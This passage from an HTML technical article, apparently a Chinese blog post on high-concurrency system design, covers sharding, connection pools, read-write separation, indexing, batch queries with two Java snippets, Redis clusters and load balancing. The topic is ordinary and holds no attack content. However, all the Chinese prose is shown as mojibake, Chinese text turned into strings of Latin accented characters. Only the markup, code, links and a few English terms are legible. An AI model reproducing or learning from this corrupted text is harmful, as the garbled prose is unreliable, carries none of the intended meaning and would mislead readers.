<li>ç»™idæŒ‡å®šä¸€ä¸ªåŒºé—´èŒƒå›´ï¼Œæ¯”å¦‚ï¼šidçš„å€¼æ˜¯0-10ä¸‡ï¼Œåˆ™æ•°æ®å­˜åœ¨ç”¨æˆ·è¡¨0ï¼Œidçš„å€¼æ˜¯10-20ä¸‡ï¼Œåˆ™æ•°æ®å­˜åœ¨ç”¨æˆ·è¡¨1ã€‚</li>
<li>ä¸€è‡´æ€§hashç®—æ³•</li>
</ul>
<p>åˆ†åº“åˆ†è¡¨ä¸»è¦æœ‰ä¸¤ä¸ªæ–¹å‘ï¼š<code>å‚ç›´</code>å’Œ<code>æ°´å¹³</code>ã€‚</p>
<p>è¯´å®è¯å‚ç›´æ–¹å‘ï¼ˆå³ä¸šåŠ¡æ–¹å‘ï¼‰æ›´ç®€å•ã€‚</p>
<p>åœ¨æ°´å¹³æ–¹å‘ï¼ˆå³æ•°æ®æ–¹å‘ï¼‰ä¸Šï¼Œåˆ†åº“å’Œåˆ†è¡¨çš„ä½œç”¨ï¼Œå…¶å®æ˜¯æœ‰åŒºåˆ«çš„ï¼Œä¸èƒ½æ··ä¸ºä¸€è°ˆã€‚</p>
<ul>
<li>åˆ†åº“ï¼šæ˜¯ä¸ºäº†è§£å†³æ•°æ®åº“è¿æ¥èµ„æºä¸è¶³é—®é¢˜ï¼Œå’Œç£ç›˜IOçš„æ€§èƒ½ç“¶é¢ˆé—®é¢˜ã€‚</li>
<li>åˆ†è¡¨ï¼šæ˜¯ä¸ºäº†è§£å†³å•è¡¨æ•°æ®é‡å¤ªå¤§ï¼Œsqlè¯­å¥æŸ¥è¯¢æ•°æ®æ—¶ï¼Œå³ä½¿èµ°äº†ç´¢å¼•ä¹Ÿéå¸¸è€—æ—¶é—®é¢˜ã€‚æ­¤å¤–è¿˜å¯ä»¥è§£å†³æ¶ˆè€—cpuèµ„æºé—®é¢˜ã€‚</li>
<li>åˆ†åº“åˆ†è¡¨ï¼šå¯ä»¥è§£å†³ æ•°æ®åº“è¿æ¥èµ„æºä¸è¶³ã€ç£ç›˜IOçš„æ€§èƒ½ç“¶é¢ˆã€æ£€ç´¢æ•°æ®è€—æ—¶ å’Œ æ¶ˆè€—cpuèµ„æºç­‰é—®é¢˜ã€‚</li>
</ul>
<p>å¦‚æœåœ¨æœ‰äº›ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œç”¨æˆ·å¹¶å‘é‡å¾ˆå¤§ï¼Œä½†æ˜¯éœ€è¦ä¿å­˜çš„æ•°æ®é‡å¾ˆå°‘ï¼Œè¿™æ—¶å¯ä»¥åªåˆ†åº“ï¼Œä¸åˆ†è¡¨ã€‚</p>
<p>å¦‚æœåœ¨æœ‰äº›ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œç”¨æˆ·å¹¶å‘é‡ä¸å¤§ï¼Œä½†æ˜¯éœ€è¦ä¿å­˜çš„æ•°é‡å¾ˆå¤šï¼Œè¿™æ—¶å¯ä»¥åªåˆ†è¡¨ï¼Œä¸åˆ†åº“ã€‚</p>
<p>å¦‚æœåœ¨æœ‰äº›ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œç”¨æˆ·å¹¶å‘é‡å¤§ï¼Œå¹¶ä¸”éœ€è¦ä¿å­˜çš„æ•°é‡ä¹Ÿå¾ˆå¤šæ—¶ï¼Œå¯ä»¥åˆ†åº“åˆ†è¡¨ã€‚</p>
<p>å…³äºåˆ†åº“åˆ†è¡¨æ›´è¯¦ç»†çš„å†…å®¹ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘å¦ä¸€ç¯‡æ–‡ç« ï¼Œé‡Œé¢è®²çš„æ›´æ·±å…¥ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247490459%26idx%3D1%26sn%3D1e4296228c00aa4203aab481575ac916%26chksm%3Dc0ebc373f79c4a658de7ce7f0d8cf30b1f45adb346c2386321779e7cf85a757a12337d3ae233%26token%3D2041133408%26lang%3Dzh_CN%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247490459&amp;idx=1&amp;sn=1e4296228c00aa4203aab481575ac916&amp;chksm=c0ebc373f79c4a658de7ce7f0d8cf30b1f45adb346c2386321779e7cf85a757a12337d3ae233&amp;token=2041133408&amp;lang=zh_CN&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">é˜¿é‡ŒäºŒé¢ï¼šä¸ºä»€ä¹ˆåˆ†åº“åˆ†è¡¨ï¼Ÿ</a>ã€‹</p>
<h2 data-id="heading-9">7 æ± åŒ–æŠ€æœ¯</h2>
<p>å…¶å®ä¸å…‰æ˜¯é«˜å¹¶å‘ç³»ç»Ÿï¼Œä¸ºäº†æ€§èƒ½è€ƒè™‘ï¼Œæœ‰äº›ä½å¹¶å‘çš„ç³»ç»Ÿï¼Œä¹Ÿåœ¨ä½¿ç”¨<code>æ± åŒ–æŠ€æœ¯</code>ï¼Œæ¯”å¦‚ï¼šæ•°æ®åº“è¿æ¥æ± ã€çº¿ç¨‹æ± ç­‰ã€‚</p>
<p>æ± åŒ–æŠ€æœ¯æ˜¯<code>å¤šä¾‹è®¾è®¡æ¨¡å¼</code>çš„ä¸€ä¸ªä½“ç°ã€‚</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“<code>åˆ›å»º</code>å’Œ<code>é”€æ¯</code>æ•°æ®åº“è¿æ¥æ˜¯éå¸¸è€—æ—¶è€—èµ„æºçš„æ“ä½œã€‚</p>
<p>å¦‚æœæ¯æ¬¡ç”¨æˆ·è¯·æ±‚ï¼Œéƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“è¿æ¥ï¼ŒåŠ¿å¿…ä¼šå½±å“ç¨‹åºçš„æ€§èƒ½ã€‚</p>
<p>ä¸ºäº†æå‡æ€§èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€æ‰¹æ•°æ®åº“è¿æ¥ï¼Œä¿å­˜åˆ°å†…å­˜ä¸­çš„æŸä¸ªé›†åˆä¸­ï¼Œç¼“å­˜èµ·æ¥ã€‚</p>
<p>è¿™æ ·çš„è¯ï¼Œå¦‚æœä¸‹æ¬¡æœ‰éœ€è¦ç”¨æ•°æ®åº“è¿æ¥çš„æ—¶å€™ï¼Œå°±èƒ½ç›´æ¥ä»é›†åˆä¸­è·å–ï¼Œä¸ç”¨å†é¢å¤–åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼Œè¿™æ ·å¤„ç†å°†ä¼šç»™æˆ‘ä»¬æå‡ç³»ç»Ÿæ€§èƒ½ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c14efe3606f43dbbc6c0882ceb2d064~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=QTipTkSx%2BiSsQXtqz10i8hGgJRw%3D" alt="" loading="lazy"/>
å½“ç„¶ç”¨å®Œä¹‹åï¼Œéœ€è¦åŠæ—¶å½’è¿˜ã€‚</p>
<p>ç›®å‰å¸¸ç”¨çš„æ•°æ®åº“è¿æ¥æ± æœ‰ï¼šDruidã€C3P0ã€hikariå’ŒDBCPç­‰ã€‚</p>
<h2 data-id="heading-10">8 è¯»å†™åˆ†ç¦»</h2>
<p>ä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰å¬è¯´è¿‡<code>äºŒå…«åŸåˆ™</code>ï¼Œåœ¨ä¸€ä¸ªç³»ç»Ÿå½“ä¸­å¯èƒ½æœ‰80%æ˜¯è¯»æ•°æ®è¯·æ±‚ï¼Œå¦å¤–20%æ˜¯å†™æ•°æ®è¯·æ±‚ã€‚</p>
<p>ä¸è¿‡è¿™ä¸ªæ¯”ä¾‹ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚</p>
<p>æˆ‘æƒ³å‘Šè¯‰å¤§å®¶çš„æ˜¯ï¼Œä¸€èˆ¬çš„ç³»ç»Ÿè¯»æ•°æ®è¯·æ±‚ä¼šè¿œè¿œå¤§äºå†™æ•°æ®è¯·æ±‚ã€‚</p>
<p>å¦‚æœè¯»æ•°æ®è¯·æ±‚å’Œå†™æ•°æ®è¯·æ±‚ï¼Œéƒ½è®¿é—®åŒä¸€ä¸ªæ•°æ®åº“ï¼Œå¯èƒ½ä¼šç›¸äº’æŠ¢å æ•°æ®åº“è¿æ¥ï¼Œç›¸äº’å½±å“ã€‚</p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œä¸€ä¸ªæ•°æ®åº“çš„æ•°æ®åº“è¿æ¥æ•°é‡æ˜¯æœ‰é™ï¼Œæ˜¯éå¸¸å®è´µçš„èµ„æºï¼Œä¸èƒ½å› ä¸ºè¯»æ•°æ®è¯·æ±‚ï¼Œå½±å“åˆ°å†™æ•°æ®è¯·æ±‚å§ï¼Ÿ</p>
<p>è¿™å°±éœ€è¦å¯¹æ•°æ®åº“åš<code>è¯»å†™åˆ†ç¦»</code>äº†ã€‚</p>
<p>äºæ˜¯ï¼Œå°±å‡ºç°äº†ä¸»ä»è¯»å†™åˆ†ç¦»æ¶æ„ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e88e20b1c0b847c9b9fe868bf7bcfe19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=UCqKVg5X41xUeRX%2BdlH5ZKb0xx4%3D" alt="" loading="lazy"/>
è€ƒè™‘åˆšå¼€å§‹ç”¨æˆ·é‡è¿˜æ²¡é‚£ä¹ˆå¤§ï¼Œé€‰æ‹©çš„æ˜¯ä¸€ä¸»ä¸€ä»çš„æ¶æ„ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„ä¸€ä¸ª<code>master</code>ï¼Œä¸€ä¸ª<code>slave</code>ã€‚</p>
<p>æ‰€æœ‰çš„å†™æ•°æ®è¯·æ±‚ï¼Œéƒ½æŒ‡å‘ä¸»åº“ã€‚ä¸€æ—¦ä¸»åº“å†™å®Œæ•°æ®ä¹‹åï¼Œç«‹é©¬å¼‚æ­¥åŒæ­¥ç»™ä»åº“ã€‚è¿™æ ·æ‰€æœ‰çš„è¯»æ•°æ®è¯·æ±‚ï¼Œå°±èƒ½åŠæ—¶ä»ä»åº“ä¸­è·å–åˆ°æ•°æ®äº†ï¼ˆé™¤éç½‘ç»œæœ‰å»¶è¿Ÿï¼‰ã€‚</p>
<p>ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼šå¦‚æœç”¨æˆ·é‡ç¡®å®æœ‰äº›å¤§ï¼Œå¦‚æœmasteræŒ‚äº†ï¼Œå‡çº§slaveä¸ºmasterï¼Œå°†æ‰€æœ‰è¯»å†™è¯·æ±‚éƒ½æŒ‡å‘æ–°masterã€‚</p>
<p>ä½†æ­¤æ—¶ï¼Œå¦‚æœè¿™ä¸ªæ–°masteræ ¹æœ¬æ‰›ä¸ä½æ‰€æœ‰çš„è¯»å†™è¯·æ±‚ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>è¿™å°±éœ€è¦ä¸€ä¸»å¤šä»çš„æ¶æ„äº†ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11940b56d35b4c0bb9af605cb27abc87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=k%2BOz3q7DoFt%2F6OJom3LOwL03wDg%3D" alt="" loading="lazy"/>
ä¸Šå›¾ä¸­æˆ‘åˆ—çš„æ˜¯ä¸€ä¸»ä¸¤ä»ï¼Œå¦‚æœmasteræŒ‚äº†ï¼Œå¯ä»¥é€‰æ‹©ä»åº“1æˆ–ä»åº“2ä¸­çš„ä¸€ä¸ªï¼Œå‡çº§ä¸ºæ–°masterã€‚å‡å¦‚æˆ‘ä»¬åœ¨è¿™é‡Œå‡çº§ä»åº“1ä¸ºæ–°masterï¼Œåˆ™åŸæ¥çš„ä»åº“2å°±å˜æˆäº†æ–°masterçš„çš„slaveäº†ã€‚</p>
<p>è°ƒæ•´ä¹‹åçš„æ¶æ„å›¾å¦‚ä¸‹ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb223b979b0c4691a39dae3da965af21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=wOvSes5s3aethDnJXfJ11lJuAHc%3D" alt="" loading="lazy"/>
è¿™æ ·å°±èƒ½è§£å†³ä¸Šé¢çš„é—®é¢˜äº†ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚æœæŸ¥è¯¢è¯·æ±‚é‡å†å¢å¤§ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†æ¶æ„å‡çº§ä¸ºä¸€ä¸»ä¸‰ä»ã€ä¸€ä¸»å››ä»...ä¸€ä¸»Nä»ç­‰ã€‚</p>
<h2 data-id="heading-11">9 ç´¢å¼•</h2>
<p>åœ¨é«˜å¹¶å‘çš„ç³»ç»Ÿå½“ä¸­ï¼Œç”¨æˆ·ç»å¸¸éœ€è¦æŸ¥è¯¢æ•°æ®ï¼Œå¯¹æ•°æ®åº“å¢åŠ <code>ç´¢å¼•</code>ï¼Œæ˜¯å¿…ä¸å¯å°‘çš„ä¸€ä¸ªç¯èŠ‚ã€‚</p>
<p>å°¤å…¶æ˜¯è¡¨ä¸­æ•°æ®éå¸¸å¤šæ—¶ï¼ŒåŠ äº†ç´¢å¼•ï¼Œè·Ÿæ²¡åŠ ç´¢å¼•ï¼Œæ‰§è¡ŒåŒä¸€æ¡sqlè¯­å¥ï¼ŒæŸ¥è¯¢ç›¸åŒçš„æ•°æ®ï¼Œè€—æ—¶å¯èƒ½ä¼šç›¸å·®Nä¸ªæ•°é‡çº§ã€‚</p>
<p>è™½è¯´ç´¢å¼•èƒ½å¤Ÿæå‡SQLè¯­å¥çš„æŸ¥è¯¢é€Ÿåº¦ï¼Œä½†ç´¢å¼•ä¹Ÿä¸æ˜¯è¶Šå¤šè¶Šå¥½ã€‚</p>
<p>åœ¨insertæ•°æ®æ—¶ï¼Œéœ€è¦ç»™ç´¢å¼•åˆ†é…é¢å¤–çš„èµ„æºï¼Œå¯¹insertçš„æ€§èƒ½æœ‰ä¸€å®šçš„æŸè€—ã€‚</p>
<p>æˆ‘ä»¬è¦æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯æ¥å†³å®šåˆ›å»ºå“ªäº›ç´¢å¼•ï¼Œç´¢å¼•å°‘äº†ï¼Œå½±å“æŸ¥è¯¢é€Ÿåº¦ï¼Œç´¢å¼•å¤šäº†ï¼Œå½±å“å†™å…¥é€Ÿåº¦ã€‚</p>
<p>å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ç»å¸¸å¯¹ç´¢å¼•åšä¼˜åŒ–ã€‚</p>
<ol>
<li>å¯ä»¥å°†å¤šä¸ªå•ä¸ªç´¢å¼•ï¼Œæ”¹æˆä¸€ä¸ªè”åˆç´¢å¼•ã€‚</li>
<li>åˆ é™¤ä¸è¦ç´¢å¼•ã€‚</li>
<li>ä½¿ç”¨explainå…³é”®å­—ï¼ŒæŸ¥è¯¢SQLè¯­å¥çš„æ‰§è¡Œè®¡åˆ’ï¼Œçœ‹çœ‹å“ªäº›èµ°äº†ç´¢å¼•ï¼Œå“ªäº›æ²¡æœ‰èµ°ç´¢å¼•ã€‚</li>
<li>è¦æ³¨æ„ç´¢å¼•å¤±æ•ˆçš„ä¸€äº›åœºæ™¯ã€‚</li>
<li>å¿…è¦æ—¶å¯ä»¥ä½¿ç”¨force indexæ¥å¼ºåˆ¶æŸ¥è¯¢sqlèµ°æŸä¸ªç´¢å¼•ã€‚</li>
</ol>
<p>å¦‚æœä½ æƒ³è¿›ä¸€æ­¥äº†è§£explainçš„è¯¦ç»†ç”¨æ³•ï¼Œå¯ä»¥çœ‹çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247490262%26idx%3D1%26sn%3Da67f610afa984ecca130a54a3be453ab%26chksm%3Dc0ebc23ef79c4b2869dea998e413c5cbea6aeeea01ee74efc7c1a5fc228baa7beca215adf3ea%26token%3D751314179%26lang%3Dzh_CN%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247490262&amp;idx=1&amp;sn=a67f610afa984ecca130a54a3be453ab&amp;chksm=c0ebc23ef79c4b2869dea998e413c5cbea6aeeea01ee74efc7c1a5fc228baa7beca215adf3ea&amp;token=751314179&amp;lang=zh_CN&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">explain | ç´¢å¼•ä¼˜åŒ–çš„è¿™æŠŠç»ä¸–å¥½å‰‘ï¼Œä½ çœŸçš„ä¼šç”¨å—ï¼Ÿ</a>ã€‹ã€‚</p>
<p>å¦‚æœä½ æƒ³è¿›ä¸€æ­¥äº†è§£å“ªäº›æƒ…å†µä¸‹ç´¢å¼•ä¼šå¤±æ•ˆï¼Œå¯ä»¥çœ‹çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwNjMwMTgzMQ%3D%3D%26mid%3D2247491626%26idx%3D1%26sn%3D18fc949c06f04fe8f4c29b6fc5c66f9c%26chksm%3Dc0e838c2f79fb1d45c6f9b2ab188bb4663414690bab0718a7d46beb875e6b83e5e67ec27d2ff%26token%3D902535653%26lang%3Dzh_CN%23rd" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwNjMwMTgzMQ==&amp;mid=2247491626&amp;idx=1&amp;sn=18fc949c06f04fe8f4c29b6fc5c66f9c&amp;chksm=c0e838c2f79fb1d45c6f9b2ab188bb4663414690bab0718a7d46beb875e6b83e5e67ec27d2ff&amp;token=902535653&amp;lang=zh_CN#rd" ref="nofollow noopener noreferrer">èŠèŠç´¢å¼•å¤±æ•ˆçš„10ç§åœºæ™¯ï¼Œå¤ªå‘äº†</a>ã€‹ã€‚</p>
<h2 data-id="heading-12">10 æ‰¹å¤„ç†</h2>
<p>æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä»æŒ‡å®šçš„ç”¨æˆ·é›†åˆä¸­ï¼ŒæŸ¥è¯¢å‡ºæœ‰å“ªäº›æ˜¯åœ¨æ•°æ®åº“ä¸­å·²ç»å­˜åœ¨çš„ã€‚</p>
<p>å®ç°ä»£ç å¯ä»¥è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryUser</span><span class="hljs-params">(List&lt;User&gt; searchList)</span> {
    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(searchList)) {
        <span class="hljs-keyword">return</span> Collections.emptyList();
    }

    List&lt;User&gt; result = Lists.newArrayList();
    searchList.forEach(user -&gt; result.add(userMapper.getUserById(user.getId())));
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>è¿™é‡Œå¦‚æœæœ‰50ä¸ªç”¨æˆ·ï¼Œåˆ™éœ€è¦å¾ªç¯50æ¬¡ï¼Œå»æŸ¥è¯¢æ•°æ®åº“ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ¯æŸ¥è¯¢ä¸€æ¬¡æ•°æ®åº“ï¼Œå°±æ˜¯ä¸€æ¬¡è¿œç¨‹è°ƒç”¨ã€‚</p>
<p>å¦‚æœæŸ¥è¯¢50æ¬¡æ•°æ®åº“ï¼Œå°±æœ‰50æ¬¡è¿œç¨‹è°ƒç”¨ï¼Œè¿™æ˜¯éå¸¸è€—æ—¶çš„æ“ä½œã€‚</p>
<p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p>ç­”ï¼š<code>æ‰¹å¤„ç†</code>ã€‚</p>
<p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryUser</span><span class="hljs-params">(List&lt;User&gt; searchList)</span> {
    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(searchList)) {
        <span class="hljs-keyword">return</span> Collections.emptyList();
    }
    List&lt;Long&gt; ids = searchList.stream().map(User::getId).collect(Collectors.toList());
    <span class="hljs-keyword">return</span> userMapper.getUserByIds(ids);
}
</code></pre>
<p>æä¾›ä¸€ä¸ªæ ¹æ®ç”¨æˆ·idé›†åˆ<code>æ‰¹é‡æŸ¥è¯¢</code>ç”¨æˆ·çš„æ¥å£ï¼Œåªè¿œç¨‹è°ƒç”¨ä¸€æ¬¡ï¼Œå°±èƒ½æŸ¥è¯¢å‡ºæ‰€æœ‰çš„æ•°æ®ã€‚</p>
<p>è¿™é‡Œæœ‰ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼šidé›†åˆçš„å¤§å°è¦åšé™åˆ¶ï¼Œæœ€å¥½ä¸€æ¬¡ä¸è¦è¯·æ±‚å¤ªå¤šçš„æ•°æ®ã€‚è¦æ ¹æ®å®é™…æƒ…å†µè€Œå®šï¼Œå»ºè®®æ§åˆ¶æ¯æ¬¡è¯·æ±‚çš„è®°å½•æ¡æ•°åœ¨500ä»¥å†…ã€‚</p>
<h2 data-id="heading-13">11 é›†ç¾¤</h2>
<p>ç³»ç»Ÿéƒ¨ç½²çš„æœåŠ¡å™¨èŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šdownæœºï¼Œæ¯”å¦‚ï¼šæœåŠ¡å™¨çš„ç£ç›˜åäº†ï¼Œæˆ–è€…æ“ä½œç³»ç»Ÿå‡ºç°å†…å­˜ä¸è¶³é—®é¢˜ã€‚</p>
<p>ä¸ºäº†ä¿è¯ç³»ç»Ÿçš„é«˜å¯ç”¨ï¼Œæˆ‘ä»¬éœ€è¦éƒ¨ç½²å¤šä¸ªèŠ‚ç‚¹ï¼Œæ„æˆä¸€ä¸ª<code>é›†ç¾¤</code>ï¼Œé˜²æ­¢å› ä¸ºéƒ¨åˆ†æœåŠ¡å™¨èŠ‚ç‚¹æŒ‚äº†ï¼Œå¯¼è‡´ç³»ç»Ÿçš„æ•´ä¸ªæœåŠ¡ä¸å¯ç”¨çš„æƒ…å†µå‘ç”Ÿã€‚</p>
<p>é›†ç¾¤æœ‰å¾ˆå¤šç§ï¼š</p>
<ol>
<li>åº”ç”¨æœåŠ¡å™¨é›†ç¾¤</li>
<li>æ•°æ®åº“é›†ç¾¤</li>
<li>ä¸­é—´ä»¶é›†ç¾¤</li>
<li>æ–‡ä»¶æœåŠ¡å™¨é›†ç¾¤</li>
</ol>
<p>æˆ‘ä»¬ä»¥ä¸­é—´ä»¶<code>Redis</code>ä¸ºä¾‹ã€‚</p>
<p>åœ¨é«˜å¹¶å‘ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·çš„æ•°æ®é‡éå¸¸åºå¤§æ—¶ï¼Œæ¯”å¦‚ç”¨æˆ·çš„ç¼“å­˜æ•°æ®æ€»å…±å¤§å°æœ‰40Gï¼Œä¸€ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹åªæœ‰16Gçš„å†…å­˜ã€‚</p>
<p>è¿™æ ·éœ€è¦éƒ¨ç½²3å°æœåŠ¡å™¨èŠ‚ç‚¹ã€‚</p>
<p>è¯¥ä¸šåŠ¡åœºæ™¯ï¼Œä½¿ç”¨æ™®é€šçš„master/slaveæ¨¡å¼ï¼Œæˆ–è€…ä½¿ç”¨å“¨å…µæ¨¡å¼éƒ½è¡Œä¸é€šã€‚</p>
<p>40Gçš„æ•°æ®ï¼Œä¸èƒ½åªä¿å­˜åˆ°ä¸€å°æœåŠ¡å™¨èŠ‚ç‚¹ï¼Œéœ€è¦å‡åˆ†åˆ°3ä¸ªmasteræœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œä¸€ä¸ªmasteræœåŠ¡å™¨èŠ‚ç‚¹ä¿å­˜13.3Gçš„æ•°æ®ã€‚</p>
<p>å½“æœ‰ç”¨æˆ·è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œå…ˆç»è¿‡è·¯ç”±ï¼Œæ ¹æ®ç”¨æˆ·çš„idæˆ–è€…ipï¼Œæ¯æ¬¡éƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡å™¨èŠ‚ç‚¹ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88762cfa75a1483d926bda60f3a8d948~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=jOfwxSHboLh0DP%2FC%2Bm8VFx%2FFzUs%3D" alt="" loading="lazy"/>
è¿™ç”¨å°±æ„æˆäº†ä¸€ä¸ªé›†ç¾¤ã€‚</p>
<p>ä½†è¿™æ ·æœ‰é£é™©ï¼Œä¸ºäº†é˜²æ­¢å…¶ä¸­ä¸€ä¸ªmasteræœåŠ¡å™¨èŠ‚ç‚¹æŒ‚æ‰ï¼Œå¯¼è‡´éƒ¨åˆ†ç”¨æˆ·çš„ç¼“å­˜è®¿é—®ä¸äº†ï¼Œè¿˜éœ€è¦å¯¹æ•°æ®åšå¤‡ä»½ã€‚</p>
<p>è¿™æ ·æ¯ä¸€ä¸ªmasterï¼Œéƒ½éœ€è¦æœ‰ä¸€ä¸ªslaveï¼Œåšæ•°æ®å¤‡ä»½ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/340ac6995b874d13af2dfa4d13ecb81f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534266&amp;x-signature=3jYono6YFtr6zhtYRLdT6Jex7NM%3D" alt="" loading="lazy"/>
å¦‚æœmasteræŒ‚äº†ï¼Œå¯ä»¥å°†slaveå‡çº§ä¸ºæ–°çš„masterï¼Œè€Œä¸å½±å“ç”¨æˆ·çš„æ­£å¸¸ä½¿ç”¨ã€‚</p>
<h2 data-id="heading-14">12 è´Ÿè½½å‡è¡¡</h2>
<p>å¦‚æœæˆ‘ä»¬çš„ç³»ç»Ÿéƒ¨ç½²åˆ°äº†å¤šå°æœåŠ¡å™¨èŠ‚ç‚¹ã€‚é‚£ä¹ˆå“ªäº›ç”¨æˆ·çš„è¯·æ±‚ï¼Œè®¿é—®èŠ‚ç‚¹aï¼Œå“ªäº›ç”¨æˆ·çš„è¯·æ±‚ï¼Œè®¿é—®èŠ‚ç‚¹bï¼Œå“ªäº›ç”¨æˆ·çš„è¯·æ±‚ï¼Œè®¿é—®èŠ‚ç‚¹cï¼Ÿ</p>
<p>æˆ‘ä»¬éœ€è¦æŸç§æœºåˆ¶ï¼Œå°†ç”¨æˆ·çš„è¯·æ±‚ï¼Œè½¬å‘åˆ°å…·ä½“çš„æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šã€‚</p>
<p>è¿™å°±éœ€è¦ä½¿ç”¨<code>è´Ÿè½½å‡è¡¡</code>æœºåˆ¶äº†ã€‚</p>
<p>åœ¨linuxä¸‹æœ‰<code>Nginx</code>ã€<code>LVS</code>ã€<code>Haproxy</code>ç­‰æœåŠ¡å¯ä»¥æä¾›è´Ÿè½½å‡è¡¡æœåŠ¡ã€‚</p>
<p>åœ¨SpringCloudå¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¤§éƒ¨åˆ†ä½¿ç”¨çš„è´Ÿè½½å‡è¡¡ç»„ä»¶å°±æ˜¯<code>Ribbon</code>ã€<code>OpenFegin</code>æˆ–<code>SpringCloud Loadbalancer</code>ã€‚</p>
<p>ç¡¬ä»¶æ–¹é¢ï¼Œå¯ä»¥ä½¿ç”¨<code>F5</code>å®ç°è´Ÿè½½å‡è¡¡ã€‚å®ƒå¯ä»¥åŸºäºäº¤æ¢æœºå®ç°è´Ÿè½½å‡è¡¡ï¼Œæ€§èƒ½æ›´å¥½ï¼Œä½†æ˜¯ä»·æ ¼æ›´è´µä¸€äº›ã€‚</p>
<p>å¸¸ç”¨çš„è´Ÿè½½å‡è¡¡ç­–ç•¥æœ‰ï¼š</p>
<ol>
